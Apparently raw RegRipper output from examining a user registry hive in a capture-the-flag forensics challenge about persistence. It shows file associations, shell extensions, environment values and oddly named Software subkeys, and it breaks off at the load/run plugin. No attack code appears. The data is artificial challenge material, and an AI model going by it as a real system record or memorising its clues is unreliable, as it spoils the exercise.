@@ -1,0 +1,923 @@
+Hive (C:\Users\marnold\CODE\CTF\htb\cyber-apoc-2022\forensics\Golden_Persistence\NTUSER.DAT) is dirty.
+If you need to process hive transasction logs, please consider using yarp + registryFlush.py
+(Maxim Suhanov) or rla.exe (Eric Zimmerman).
+
+adobe v.20200522
+(NTUSER.DAT) Gets user's Adobe app cRecentFiles values
+
+Could not access Software\Adobe\Adobe Acrobat\\AVGeneral\cRecentFiles
+
+Could not access Software\Adobe\Acrobat Reader\\AVGeneral\cRecentFiles
+
+----------------------------------------
+allowedenum v.20200511
+(NTUSER.DAT, Software) Extracts AllowedEnumeration values to determine hidden special folders
+
+Software\Microsoft\Windows\CurrentVersion\Explorer\AllowedEnumeration not found.
+Microsoft\Windows\CurrentVersion\Explorer\AllowedEnumeration not found.
+----------------------------------------
+appassoc v.20200515
+- Gets contents of user's ApplicationAssociationToasts key
+
+LastWrite: 2022-04-11 14:18:11Z
+
+AppX6eg8h5sxqq90pv53845wmnbewywdqq5h_.3g2
+AppXk0g4vb8gvt7b93tg50ybcy892pge6jmt_.3g2
+AppXmk63adfvvewttqzmezsgagxtcyyr84tx_.3g2
+AppX6eg8h5sxqq90pv53845wmnbewywdqq5h_.3gp
+AppXk0g4vb8gvt7b93tg50ybcy892pge6jmt_.3gp
+AppXmk63adfvvewttqzmezsgagxtcyyr84tx_.3gp
+AppXk0g4vb8gvt7b93tg50ybcy892pge6jmt_.3gp2
+AppX6eg8h5sxqq90pv53845wmnbewywdqq5h_.3gpp
+AppXk0g4vb8gvt7b93tg50ybcy892pge6jmt_.3gpp
+AppXmk63adfvvewttqzmezsgagxtcyyr84tx_.3gpp
+AppXmgw6pxxs62rbgfp9petmdyb4fx7rnd4k_.3mf
+AppXcdh38jxzbcberv50vxg2tg4k84kfnewn_.3mf
+AppXr0rz9yckydawgnrx5df1t9s57ne60yhn_.3mf
+AppXvhc4p7vz4b485xfp46hhk3fq3grkdgjg_.3mf
+AppX9v2an58zgtq78h18jgmp43b5gza6b2jp_.aac
+AppXqj98qxeaynz6dv4459ayz6bnqxbyaqcs_.aac
+AppXqj98qxeaynz6dv4459ayz6bnqxbyaqcs_.ac3
+AppX9v2an58zgtq78h18jgmp43b5gza6b2jp_.adt
+AppXqj98qxeaynz6dv4459ayz6bnqxbyaqcs_.adt
+AppX9v2an58zgtq78h18jgmp43b5gza6b2jp_.adts
+AppXqj98qxeaynz6dv4459ayz6bnqxbyaqcs_.adts
+AppXqj98qxeaynz6dv4459ayz6bnqxbyaqcs_.amr
+AppX9rkaq77s0jzh1tyccadx9ghba15r6t3h_.arw
+WMP11.AssocFile.ASF_.asf
+AppXk0g4vb8gvt7b93tg50ybcy892pge6jmt_.asf
+AppX6eg8h5sxqq90pv53845wmnbewywdqq5h_.avi
+AppXk0g4vb8gvt7b93tg50ybcy892pge6jmt_.avi
+AppXmk63adfvvewttqzmezsgagxtcyyr84tx_.avi
+AppXcdh38jxzbcberv50vxg2tg4k84kfnewn_.bmp
+AppX9rkaq77s0jzh1tyccadx9ghba15r6t3h_.cr2
+AppX9rkaq77s0jzh1tyccadx9ghba15r6t3h_.crw
+AppXcdh38jxzbcberv50vxg2tg4k84kfnewn_.dib
+AppXmk63adfvvewttqzmezsgagxtcyyr84tx_.divx
+docxfile_.docx
+AppXqj98qxeaynz6dv4459ayz6bnqxbyaqcs_.ec3
+AppXvepbp3z66accmsd0x877zbbxjctkpr6t_.epub
+AppX9rkaq77s0jzh1tyccadx9ghba15r6t3h_.erf
+AppXmgw6pxxs62rbgfp9petmdyb4fx7rnd4k_.fbx
+AppXcdh38jxzbcberv50vxg2tg4k84kfnewn_.fbx
+AppXr0rz9yckydawgnrx5df1t9s57ne60yhn_.fbx
+AppXvhc4p7vz4b485xfp46hhk3fq3grkdgjg_.fbx
+AppX9v2an58zgtq78h18jgmp43b5gza6b2jp_.flac
+AppXqj98qxeaynz6dv4459ayz6bnqxbyaqcs_.flac
+AppXcdh38jxzbcberv50vxg2tg4k84kfnewn_.gif
+AppXmgw6pxxs62rbgfp9petmdyb4fx7rnd4k_.glb
+AppXcdh38jxzbcberv50vxg2tg4k84kfnewn_.glb
+AppXr0rz9yckydawgnrx5df1t9s57ne60yhn_.glb
+AppXvhc4p7vz4b485xfp46hhk3fq3grkdgjg_.glb
+AppXmgw6pxxs62rbgfp9petmdyb4fx7rnd4k_.gltf
+AppXcdh38jxzbcberv50vxg2tg4k84kfnewn_.gltf
+AppXr0rz9yckydawgnrx5df1t9s57ne60yhn_.gltf
+AppXvhc4p7vz4b485xfp46hhk3fq3grkdgjg_.gltf
+AppX4hxtad77fbk3jkkeerkrm0ze94wjf3s9_.htm
+AppX4hxtad77fbk3jkkeerkrm0ze94wjf3s9_.html
+icofile_.ico
+PBrush_.ico
+AppXcdh38jxzbcberv50vxg2tg4k84kfnewn_.ico
+AppXzwr976v2e060wada4gabrk1x69h2dbwy_.inf
+AppXhk4des8gf2xat3wtyzc5q06ny78jhkqx_.ini
+AppXcdh38jxzbcberv50vxg2tg4k84kfnewn_.jfif
+AppXcdh38jxzbcberv50vxg2tg4k84kfnewn_.jpe
+AppXcdh38jxzbcberv50vxg2tg4k84kfnewn_.jpeg
+AppXcdh38jxzbcberv50vxg2tg4k84kfnewn_.jpg
+AppXfeqk92xmhxtyxytgbhn7tdqk70syjc6v_.jpg
+AppX9rkaq77s0jzh1tyccadx9ghba15r6t3h_.kdc
+AppX4ztfk9wxr86nxmzzq47px0nh0e58b8fw_.log
+WMP11.AssocFile.M2TS_.m2t
+AppX6eg8h5sxqq90pv53845wmnbewywdqq5h_.m2t
+AppXk0g4vb8gvt7b93tg50ybcy892pge6jmt_.m2t
+AppXmk63adfvvewttqzmezsgagxtcyyr84tx_.m2t
+WMP11.AssocFile.M2TS_.m2ts
+AppX6eg8h5sxqq90pv53845wmnbewywdqq5h_.m2ts
+AppXk0g4vb8gvt7b93tg50ybcy892pge6jmt_.m2ts
+AppXmk63adfvvewttqzmezsgagxtcyyr84tx_.m2ts
+WMP11.AssocFile.m3u_.m3u
+AppX9v2an58zgtq78h18jgmp43b5gza6b2jp_.m3u
+AppXqj98qxeaynz6dv4459ayz6bnqxbyaqcs_.m3u
+AppX5sy1gww9q4g2gt941cdxxd7s07xe5vph_.m4a
+AppX9v2an58zgtq78h18jgmp43b5gza6b2jp_.m4a
+AppXqj98qxeaynz6dv4459ayz6bnqxbyaqcs_.m4a
+AppXqj98qxeaynz6dv4459ayz6bnqxbyaqcs_.m4r
+AppX6eg8h5sxqq90pv53845wmnbewywdqq5h_.m4v
+AppXk0g4vb8gvt7b93tg50ybcy892pge6jmt_.m4v
+AppXmk63adfvvewttqzmezsgagxtcyyr84tx_.m4v
+AppXqj98qxeaynz6dv4459ayz6bnqxbyaqcs_.mka
+WMP11.AssocFile.MKV_.mkv
+AppX6eg8h5sxqq90pv53845wmnbewywdqq5h_.mkv
+AppXk0g4vb8gvt7b93tg50ybcy892pge6jmt_.mkv
+AppXmk63adfvvewttqzmezsgagxtcyyr84tx_.mkv
+WMP11.AssocFile.MPEG_.mod
+AppX6eg8h5sxqq90pv53845wmnbewywdqq5h_.mod
+AppXmk63adfvvewttqzmezsgagxtcyyr84tx_.mod
+AppX6eg8h5sxqq90pv53845wmnbewywdqq5h_.mov
+AppXk0g4vb8gvt7b93tg50ybcy892pge6jmt_.mov
+AppXmk63adfvvewttqzmezsgagxtcyyr84tx_.mov
+AppXmk63adfvvewttqzmezsgagxtcyyr84tx_.mp2
+AppX9v2an58zgtq78h18jgmp43b5gza6b2jp_.mp3
+AppXqj98qxeaynz6dv4459ayz6bnqxbyaqcs_.mp3
+AppX6eg8h5sxqq90pv53845wmnbewywdqq5h_.mp4
+AppXk0g4vb8gvt7b93tg50ybcy892pge6jmt_.mp4
+AppXmk63adfvvewttqzmezsgagxtcyyr84tx_.mp4
+AppX6eg8h5sxqq90pv53845wmnbewywdqq5h_.mp4v
+AppXk0g4vb8gvt7b93tg50ybcy892pge6jmt_.mp4v
+AppXmk63adfvvewttqzmezsgagxtcyyr84tx_.mp4v
+AppX9v2an58zgtq78h18jgmp43b5gza6b2jp_.mpa
+AppXqj98qxeaynz6dv4459ayz6bnqxbyaqcs_.mpa
+AppX6eg8h5sxqq90pv53845wmnbewywdqq5h_.mpe
+AppXmk63adfvvewttqzmezsgagxtcyyr84tx_.mpe
+AppX6eg8h5sxqq90pv53845wmnbewywdqq5h_.mpeg
+AppXmk63adfvvewttqzmezsgagxtcyyr84tx_.mpeg
+AppX6eg8h5sxqq90pv53845wmnbewywdqq5h_.mpg
+AppXmk63adfvvewttqzmezsgagxtcyyr84tx_.mpg
+WMP11.AssocFile.MPEG_.mpv2
+AppX6eg8h5sxqq90pv53845wmnbewywdqq5h_.mpv2
+AppXmk63adfvvewttqzmezsgagxtcyyr84tx_.mpv2
+AppX9rkaq77s0jzh1tyccadx9ghba15r6t3h_.mrw
+AppX6eg8h5sxqq90pv53845wmnbewywdqq5h_.mts
+AppXk0g4vb8gvt7b93tg50ybcy892pge6jmt_.mts
+AppXmk63adfvvewttqzmezsgagxtcyyr84tx_.mts
+AppX9rkaq77s0jzh1tyccadx9ghba15r6t3h_.nef
+AppX9rkaq77s0jzh1tyccadx9ghba15r6t3h_.nrw
+AppXmgw6pxxs62rbgfp9petmdyb4fx7rnd4k_.obj
+AppXcdh38jxzbcberv50vxg2tg4k84kfnewn_.obj
+AppXr0rz9yckydawgnrx5df1t9s57ne60yhn_.obj
+AppXvhc4p7vz4b485xfp46hhk3fq3grkdgjg_.obj
+AppXd7df65yysmdaz9xc1vjxts4ng22x2n5f_.obj
+odtfile_.odt
+AppXqj98qxeaynz6dv4459ayz6bnqxbyaqcs_.oga
+AppXqj98qxeaynz6dv4459ayz6bnqxbyaqcs_.ogg
+AppX6eg8h5sxqq90pv53845wmnbewywdqq5h_.ogm
+AppX6eg8h5sxqq90pv53845wmnbewywdqq5h_.ogv
+AppX6eg8h5sxqq90pv53845wmnbewywdqq5h_.ogx
+AppXqj98qxeaynz6dv4459ayz6bnqxbyaqcs_.opus
+AppX9rkaq77s0jzh1tyccadx9ghba15r6t3h_.orf
+AppXd4nrz8ff68srnhf9t5a8sbjyar1cr723_.pdf
+AppX9rkaq77s0jzh1tyccadx9ghba15r6t3h_.pef
+AppXmgw6pxxs62rbgfp9petmdyb4fx7rnd4k_.ply
+AppXcdh38jxzbcberv50vxg2tg4k84kfnewn_.ply
+AppXr0rz9yckydawgnrx5df1t9s57ne60yhn_.ply
+AppXvhc4p7vz4b485xfp46hhk3fq3grkdgjg_.ply
+AppXcdh38jxzbcberv50vxg2tg4k84kfnewn_.png
+AppXxf01pj590w7z9mxmyv3nx0a9ewj3e51g_.ps1
+AppXc9vj55m1n3559gcjff0scsqeket80zp7_.psd1
+AppX1b0e9ytcwx0wcmvkdey0h6af04t1ta3z_.psm1
+AppX9rkaq77s0jzh1tyccadx9ghba15r6t3h_.raf
+AppX9rkaq77s0jzh1tyccadx9ghba15r6t3h_.raw
+rtffile_.rtf
+AppX9rkaq77s0jzh1tyccadx9ghba15r6t3h_.rw2
+AppX9rkaq77s0jzh1tyccadx9ghba15r6t3h_.rwl
+AppX4ztfk9wxr86nxmzzq47px0nh0e58b8fw_.scp
+AppX9rkaq77s0jzh1tyccadx9ghba15r6t3h_.sr2
+AppX9rkaq77s0jzh1tyccadx9ghba15r6t3h_.srw
+AppXmgw6pxxs62rbgfp9petmdyb4fx7rnd4k_.stl
+AppXcdh38jxzbcberv50vxg2tg4k84kfnewn_.stl
+AppXr0rz9yckydawgnrx5df1t9s57ne60yhn_.stl
+AppXvhc4p7vz4b485xfp46hhk3fq3grkdgjg_.stl
+AppXde74bfzw9j31bzhcvsrxsyjnhhbq66cs_.svg
+AppX43hnxtbyyps62jhe9sqpdzxn1790zetc_.tif
+AppX86746z2101ayy2ygv3g96e4eqdf8r99j_.tif
+AppXcdh38jxzbcberv50vxg2tg4k84kfnewn_.tif
+AppX43hnxtbyyps62jhe9sqpdzxn1790zetc_.tiff
+AppX86746z2101ayy2ygv3g96e4eqdf8r99j_.tiff
+AppXcdh38jxzbcberv50vxg2tg4k84kfnewn_.tiff
+AppX6eg8h5sxqq90pv53845wmnbewywdqq5h_.tod
+AppXmk63adfvvewttqzmezsgagxtcyyr84tx_.tod
+AppX6eg8h5sxqq90pv53845wmnbewywdqq5h_.ts
+AppXmk63adfvvewttqzmezsgagxtcyyr84tx_.ts
+AppX6eg8h5sxqq90pv53845wmnbewywdqq5h_.tts
+AppXmk63adfvvewttqzmezsgagxtcyyr84tx_.tts
+AppX4ztfk9wxr86nxmzzq47px0nh0e58b8fw_.txt
+vcard_wab_auto_file_.vcf
+AppX9v2an58zgtq78h18jgmp43b5gza6b2jp_.wav
+AppXqj98qxeaynz6dv4459ayz6bnqxbyaqcs_.wav
+AppX6eg8h5sxqq90pv53845wmnbewywdqq5h_.webm
+AppX6eg8h5sxqq90pv53845wmnbewywdqq5h_.wm
+AppXk0g4vb8gvt7b93tg50ybcy892pge6jmt_.wm
+AppXmk63adfvvewttqzmezsgagxtcyyr84tx_.wm
+AppX9v2an58zgtq78h18jgmp43b5gza6b2jp_.wma
+AppXqj98qxeaynz6dv4459ayz6bnqxbyaqcs_.wma
+AppX6eg8h5sxqq90pv53845wmnbewywdqq5h_.wmv
+AppXk0g4vb8gvt7b93tg50ybcy892pge6jmt_.wmv
+AppXmk63adfvvewttqzmezsgagxtcyyr84tx_.wmv
+AppX9v2an58zgtq78h18jgmp43b5gza6b2jp_.wpl
+AppXqj98qxeaynz6dv4459ayz6bnqxbyaqcs_.wpl
+AppX4ztfk9wxr86nxmzzq47px0nh0e58b8fw_.wtx
+AppXcc58vyzkbjbs4ky0mxrmxf8278rk9b3t_.xml
+AppX6eg8h5sxqq90pv53845wmnbewywdqq5h_.xvid
+AppXmk63adfvvewttqzmezsgagxtcyyr84tx_.xvid
+AppXqj98qxeaynz6dv4459ayz6bnqxbyaqcs_.zpl
+AppX9v2an58zgtq78h18jgmp43b5gza6b2jp_.zpl
+AppXtggqqtcfspt6ks3fjzyfppwc05yxwtwy_mswindowsmusic
+AppX6w6n4f8xch1s3vzwf3af6bfe88qhxbza_mswindowsvideo
+AppX2jm25qtmp2qxstv333wv5mne3k5bf4bm_.bmp
+AppX2jm25qtmp2qxstv333wv5mne3k5bf4bm_.dib
+AppX2jm25qtmp2qxstv333wv5mne3k5bf4bm_.gif
+AppX2jm25qtmp2qxstv333wv5mne3k5bf4bm_.ico
+AppX2jm25qtmp2qxstv333wv5mne3k5bf4bm_.jfif
+AppX2jm25qtmp2qxstv333wv5mne3k5bf4bm_.jpe
+AppX2jm25qtmp2qxstv333wv5mne3k5bf4bm_.jpeg
+AppX2jm25qtmp2qxstv333wv5mne3k5bf4bm_.jpg
+AppX2jm25qtmp2qxstv333wv5mne3k5bf4bm_.png
+AppX2jm25qtmp2qxstv333wv5mne3k5bf4bm_.tiff
+AppX2jm25qtmp2qxstv333wv5mne3k5bf4bm_.tif
+AppX2jm25qtmp2qxstv333wv5mne3k5bf4bm_.arw
+AppX2jm25qtmp2qxstv333wv5mne3k5bf4bm_.cr2
+AppX2jm25qtmp2qxstv333wv5mne3k5bf4bm_.crw
+AppX2jm25qtmp2qxstv333wv5mne3k5bf4bm_.erf
+AppX2jm25qtmp2qxstv333wv5mne3k5bf4bm_.kdc
+AppX2jm25qtmp2qxstv333wv5mne3k5bf4bm_.mrw
+AppX2jm25qtmp2qxstv333wv5mne3k5bf4bm_.nef
+AppX2jm25qtmp2qxstv333wv5mne3k5bf4bm_.nrw
+AppX2jm25qtmp2qxstv333wv5mne3k5bf4bm_.orf
+AppX2jm25qtmp2qxstv333wv5mne3k5bf4bm_.pef
+AppX2jm25qtmp2qxstv333wv5mne3k5bf4bm_.raw
+AppX2jm25qtmp2qxstv333wv5mne3k5bf4bm_.rw2
+AppX2jm25qtmp2qxstv333wv5mne3k5bf4bm_.rwl
+AppX2jm25qtmp2qxstv333wv5mne3k5bf4bm_.sr2
+AppX2jm25qtmp2qxstv333wv5mne3k5bf4bm_.srw
+AppX2jm25qtmp2qxstv333wv5mne3k5bf4bm_.jxr
+AppX2jm25qtmp2qxstv333wv5mne3k5bf4bm_.wdp
+Windows.Sandbox_.wsb
+AppX2jm25qtmp2qxstv333wv5mne3k5bf4bm_.dng
+AppXq0fevzme2pys62n3e0fbqa7peapykr8v_http
+AppX90nv6nhay5n6a98fnetv7tpk64pp35es_https
+AppX7rm9drdg8sk7vqndwj3sdjw11x96jc0y_microsoft-edge
+AppX3xxs313wwkfjhythsb8q46xdsq8d2cvv_microsoft-edge-holographic
+AppXdn5b0j699ka5fqvrr3pgjad0evqarm6d_ms-xbl-3d8b930f
+Paint.Picture_.bmp
+CABFolder_.cab
+chm.file_.chm
+Applications\Notepad.exe_.css
+Applications\WordPad.exe_.css
+Applications\Notepad.exe_.csv
+Applications\WordPad.exe_.csv
+Paint.Picture_.dib
+giffile_.gif
+PBrush_.gif
+inffile_.inf
+inifile_.ini
+Applications\WordPad.exe_.ini
+Windows.IsoFile_.iso
+PBrush_.jfif
+PBrush_.jpe
+PBrush_.jpeg
+PBrush_.jpg
+JSFile_.js
+wdpfile_.jxr
+txtfile_.log
+MSInfoFile_.nfo
+PBrush_.png
+Microsoft.PowerShellScript.1_.ps1
+Microsoft.PowerShellData.1_.psd1
+Microsoft.PowerShellModule.1_.psm1
+regfile_.reg
+txtfile_.scp
+TIFImage.Document_.tif
+PBrush_.tif
+TIFImage.Document_.tiff
+PBrush_.tiff
+ttffile_.ttf
+txtfile_.txt
+textfile_.txt
+wdpfile_.wdp
+PBrush_.webp
+MSEdgeHTM_.webp
+txtfile_.wtx
+xmlfile_.xml
+Applications\Notepad.exe_.xml
+Applications\WordPad.exe_.xml
+CompressedFolder_.zip
+IE.HTTP_http
+MSEdgeHTM_http
+IE.HTTPS_https
+MSEdgeHTM_https
+WMP11.AssocFile.3G2_.3g2
+WMP11.AssocFile.3GP_.3gp
+WMP11.AssocFile.3G2_.3gp2
+WMP11.AssocFile.3GP_.3gpp
+WMP11.AssocFile.ADTS_.aac
+WMP11.AssocFile.ADTS_.adt
+WMP11.AssocFile.ADTS_.adts
+WMP11.AssocFile.AVI_.avi
+WMP11.AssocFile.FLAC_.flac
+htmlfile_.htm
+MSEdgeHTM_.htm
+Applications\notepad.exe_.htm
+htmlfile_.html
+MSEdgeHTM_.html
+WMP11.AssocFile.M4A_.m4a
+WMP11.AssocFile.MP4_.m4v
+WMP11.AssocFile.MKA_.mka
+WMP11.AssocFile.MOV_.mov
+WMP11.AssocFile.MP3_.MP2
+WMP11.AssocFile.MP3_.mp3
+WMP11.AssocFile.MP4_.mp4
+WMP11.AssocFile.MP4_.mp4v
+WMP11.AssocFile.MPEG_.mpa
+WMP11.AssocFile.MPEG_.MPE
+WMP11.AssocFile.MPEG_.mpeg
+WMP11.AssocFile.MPEG_.mpg
+WMP11.AssocFile.M2TS_.mts
+MSEdgePDF_.pdf
+svgfile_.svg
+MSEdgeHTM_.svg
+WMP11.AssocFile.TTS_.TS
+WMP11.AssocFile.TTS_.TTS
+InternetShortcut_.url
+WMP11.AssocFile.WAV_.wav
+Microsoft.Website_.website
+WMP11.AssocFile.ASF_.wm
+WMP11.AssocFile.WMA_.wma
+WMP11.AssocFile.WMV_.wmv
+WMP11.AssocFile.WPL_.WPL
+MSEdgeHTM_mailto
+MSEdgeHTM_read
+AppXe862j7twqs4aww05211jaakwxyfjx4da_read
+MSEdgeHTM_.mht
+MSEdgeMHT_.mht
+MSEdgeHTM_.mhtml
+MSEdgeMHT_.mhtml
+----------------------------------------
+appcompatflags v.20200525
+(NTUSER.DAT, Software) Extracts AppCompatFlags for Windows.
+
+
+Software\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\Compatibility Assistant\Store
+  2019-12-07 09:08:44Z - C:\Users\greth\AppData\Local\Microsoft\OneDrive\19.043.0304.0013\FileSyncConfig.exe
+  2019-12-07 09:08:44Z - C:\Users\greth\AppData\Local\Microsoft\OneDrive\Update\OneDriveSetup.exe
+  2019-12-07 09:08:44Z - C:\Users\greth\AppData\Local\Microsoft\OneDrive\21.220.1024.0005\FileSyncConfig.exe
+  2019-12-07 09:08:44Z - SIGN.MEDIA=1DB06810 VBoxWindowsAdditions.exe
+  2019-12-07 09:08:44Z - C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe
+----------------------------------------
+appkeys v.20200517
+(NTUSER.DAT, Software) Extracts AppKeys entries.
+
+----------------------------------------
+applets v.20200525
+(NTUSER.DAT) Gets contents of user's Applets key
+
+Applets
+Software\Microsoft\Windows\CurrentVersion\Applets
+LastWrite Time 2022-04-11 15:19:32Z
+
+Software\Microsoft\Windows\CurrentVersion\Applets\Paint\Recent File List not found.
+
+Software\Microsoft\Windows\CurrentVersion\Applets\Regedit
+LastWrite Time 2022-04-11 15:19:32Z
+RegEdit LastKey value -> Computer\HKEY_CURRENT_USER\SOFTWARE\Google\Nv50zeG
+----------------------------------------
+apppaths v.20200511
+(NTUSER.DAT,Software) Gets content of App Paths subkeys
+
+2022-04-11 14:24:40Z
+  OneDriveFileLauncher.exe - 
+2022-04-11 14:18:24Z
+  winget.exe - C:\Program Files\WindowsApps\Microsoft.DesktopAppInstaller_1.17.10271.0_x64__8wekyb3d8bbwe\winget.exe
+----------------------------------------
+Software\Microsoft\IntelliPoint\AppSpecific not found.
+----------------------------------------
+appx v.20200427
+(NTUSER.DAT, USRCLASS.DAT) Checks for persistence via Universal Windows Platform Apps
+
+----------------------------------------
+arpcache v.20200515
+(NTUSER.DAT) Retrieves CurrentVersion\App Management\ARPCache entries
+
+Software\Microsoft\Windows\CurrentVersion\App Management\ARPCache not found.
+----------------------------------------
+attachmgr v.20200525
+(NTUSER.DAT) Checks user's keys that manage the Attachment Manager functionality
+
+Software\Microsoft\Windows\CurrentVersion\Policies\Associations not found.
+
+Software\Microsoft\Windows\CurrentVersion\Policies\Attachments not found.
+
+----------------------------------------
+cached v.20200525
+(NTUSER.DAT) Gets cached Shell Extensions from NTUSER.DAT hive
+
+Software\Microsoft\Windows\CurrentVersion\Shell Extensions\Cached
+LastWrite Time 2022-04-11 15:23:28Z
+
+2022-04-11 14:18:08Z  First Load: {4234D49B-0245-4DF3-B780-3893943456E1} (IShellFolder)
+2022-04-11 14:18:10Z  First Load: {B2952B16-0E07-4E5A-B993-58C52CB94CAE} (IShellFolder)
+2022-04-11 14:18:24Z  First Load: {C7657C4A-9F68-40FA-A4DF-96BC08EB3551} ({E357FCCD-A995-4576-B01F-234630154E96})
+2022-04-11 14:23:01Z  First Load: {04731B67-D933-450A-90E6-4ACD2E9408FE} (IDelegateFolder)
+2022-04-11 14:23:29Z  First Load: {2227A280-3AEA-1069-A2DE-08002B30309D} (IShellFolder)
+2022-04-11 14:23:45Z  First Load: {BD7A2E7B-21CB-41B2-A086-B309680C6B7E} (IShellFolder)
+2022-04-11 14:23:45Z  First Load: {9E175B8B-F52A-11D8-B9A5-505054503030} (IDBProperties)
+2022-04-11 14:24:43Z  First Load: {FF393560-C2A7-11CF-BFF4-444553540000} (IShellFolder)
+2022-04-11 14:36:10Z  First Load: {9C73F5E5-7AE7-4E32-A8E8-8D23B85255BF} (IShellFolder)
+2022-04-11 14:48:49Z  First Load: {00021401-0000-0000-C000-000000000046} (IContextMenu)
+2022-04-11 14:50:12Z  First Load: {596AB062-B4D2-4215-9F74-E9109B0A8153} (IContextMenu)
+2022-04-11 14:50:12Z  First Load: {474C98EE-CF3D-41F5-80E3-4AAB0AB04301} (IContextMenu)
+2022-04-11 14:50:13Z  First Load: {CB3D0F55-BC2C-4C1A-85ED-23ED75B5106B} (IContextMenu)
+2022-04-11 14:50:13Z  First Load: {470C0EBD-5D73-4D58-9CED-E91E22E23282} (IContextMenu)
+2022-04-11 14:50:13Z  First Load: {11DBB47C-A525-400B-9E80-A54615A090C0} (IExecuteCommand)
+2022-04-11 14:50:13Z  First Load: {B7373566-8FF2-45D8-AF1F-DA39F289BCF9} (IExplorerCommand)
+2022-04-11 14:50:14Z  First Load: {F02C1A0D-BE21-4350-88B0-7367FC96EF3C} (IShellFolder)
+2022-04-11 14:50:14Z  First Load: {BBACC218-34EA-4666-9D7A-C78F2274A524} (IShellIconOverlayIdentifier)
+2022-04-11 14:50:14Z  First Load: {5AB7172C-9C11-405C-8DD5-AF20F3606282} (IShellIconOverlayIdentifier)
+2022-04-11 14:50:14Z  First Load: {A78ED123-AB77-406B-9962-2A5D9D2F7F30} (IShellIconOverlayIdentifier)
+2022-04-11 14:50:14Z  First Load: {F241C880-6982-4CE5-8CF7-7085BA96DA5A} (IShellIconOverlayIdentifier)
+2022-04-11 14:50:14Z  First Load: {A0396A93-DC06-4AEF-BEE9-95FFCCAEF20E} (IShellIconOverlayIdentifier)
+2022-04-11 14:50:14Z  First Load: {9AA2F32D-362A-42D9-9328-24A483E2CCC3} (IShellIconOverlayIdentifier)
+2022-04-11 14:50:14Z  First Load: {C5FF006E-2AE9-408C-B85B-2DFDD5449D9C} (IShellIconOverlayIdentifier)
+2022-04-11 14:50:14Z  First Load: {D9144DCD-E998-4ECA-AB6A-DCD83CCBA16D} (IShellIconOverlayIdentifier)
+2022-04-11 14:50:14Z  First Load: {4E77131D-3629-431C-9818-C5679DC83E81} (IShellIconOverlayIdentifier)
+2022-04-11 14:50:16Z  First Load: {289AF617-1CC3-42A6-926C-E6A863F0E3BA} (IDelegateFolder)
+2022-04-11 14:50:16Z  First Load: {35786D3C-B075-49B9-88DD-029876E11C01} (IDelegateFolder)
+2022-04-11 14:50:16Z  First Load: {9113A02D-00A3-46B9-BC5F-9C04DADDD5D7} (IDelegateFolder)
+2022-04-11 14:50:17Z  First Load: {2854F705-3548-414C-A113-93E27C808C85} (IContextMenu)
+2022-04-11 14:50:24Z  First Load: {776DBC8D-7347-478C-8D71-791E12EF49D8} (IExplorerCommand)
+2022-04-11 15:04:15Z  First Load: {40DD6E20-7C17-11CE-A804-00AA003CA9F6} (IShellCopyHookW)
+2022-04-11 15:23:28Z  First Load: {2781761E-28E0-4109-99FE-B9D127C57AFE} ({56FFCC30-D398-11D0-B2AE-00A0C908FA49})
+----------------------------------------
+cmdproc v.20200515
+(NTUSER.DAT) Autostart - get Command Processor\AutoRun value from NTUSER.DAT hive
+
+Software\Microsoft\Command Processor not found.
+----------------------------------------
+comdlg32 v.20200517
+
+Software\Microsoft\Windows\CurrentVersion\Explorer\ComDlg32 not found.
+----------------------------------------
+compdesc v.20200511
+(NTUSER.DAT) Gets contents of user's ComputerDescriptions key
+
+Software\Microsoft\Windows\CurrentVersion\Explorer\ComputerDescriptions not found.
+----------------------------------------
+DDO v.20140414
+(NTUSER.DAT) Gets user's DeviceDisplayObjects key contents
+
+Software\Microsoft\Windows NT\CurrentVersion\DeviceDisplayObjects not found.
+----------------------------------------
+disablemru v.20190924
+(NTUSER.DAT, Software) Checks settings disabling user's MRUs
+
+----------------------------------------
+environment v.20200512
+(System, NTUSER.DAT) Get environment vars from NTUSER.DAT & System hives
+
+Environment
+LastWrite Time: 2022-04-11 14:24:40Z
+
+Path                      %USERPROFILE%\AppData\Local\Microsoft\WindowsApps;
+TEMP                      %USERPROFILE%\AppData\Local\Temp                  
+TMP                       %USERPROFILE%\AppData\Local\Temp                  
+OneDrive                  C:\Users\greth\OneDrive                           
+----------------------------------------
+featureusage v.20200511
+(NTUSER.DAT) Extracts user's FeatureUsage data.
+
+Software\Microsoft\Windows\CurrentVersion\Explorer\FeatureUsage
+LastWrite Time:  2022-04-11 15:12:01Z
+KeyCreationTime: 2022-04-11 14:48:31Z
+
+***AppLaunch values***
+Microsoft.Windows.Explorer                                                        1
+MSEdge                                                                            1
+
+***AppSwitched values***
+{F38BF404-1D43-42F2-9305-67DE0B28FC23}\regedit.exe                                2
+
+***ShowJumpView values***
+Microsoft.Windows.Explorer                                                        1
+
+***TrayButtonClicked values***
+StartButton                                                                       1
+SearchButton                                                                      4
+
+----------------------------------------
+[-] SOFTWARE\HeidiSQL not found.
+[-] SOFTWARE\HeidiSQL\Servers not found.
+
+----------------------------------------
+[*] Desktop file Lists
+::{645FF040-5081-101B-9F08-00AA002F954E}>   
+----------------------------------------
+identities v.20200525
+(NTUSER.DAT) Extracts values from Identities key; NTUSER.DAT
+
+Identities not found.
+
+----------------------------------------
+injectdll64 v.20200427
+(NTUSER.DAT, Software) Retrieve values set to weaken Chrome security
+
+Software\Policies\Google\Chrome\CertificateTransparencyEnforcementDisabledForUrls not found.
+Policies\Google\Chrome\CertificateTransparencyEnforcementDisabledForUrls not found.
+----------------------------------------
+jumplistdata v.20200517
+Gets contents of user's JumpListData key
+
+Software\Microsoft\Windows\CurrentVersion\Search\JumpListData not found.
+----------------------------------------
+knowndev v.20200515
+(NTUSER.DAT) Gets user's KnownDevices key contents
+
+Software\Microsoft\Windows\CurrentVersion\Explorer\AutoplayHandlers\KnownDevices not found.
+----------------------------------------
+listsoft v.20200517
+(NTUSER.DAT) Lists contents of user's Software key
+
+List the contents of the Software key in the NTUSER.DAT hive
+file, in order by LastWrite time.
+
+2022-04-11 15:23:27Z 	Microsoft
+2022-04-11 15:18:53Z 	Google
+2022-04-11 15:18:38Z 	BjqAtIen
+2022-04-11 15:16:43Z 	ZYb78P4s
+2022-04-11 15:11:26Z 	AppDataLow
+2022-04-11 15:04:58Z 	RegisteredApplications
+2022-04-11 14:18:07Z 	Wow6432Node
+2022-04-11 14:18:01Z 	Policies
+----------------------------------------
+load v.20200517
+(NTUSER.DAT) Gets load and run values from user hive
+
+load
+Software\Microsoft\Windows NT\CurrentVersion\Windows
+LastWrite Time 2022-04-11 14:36:10Z
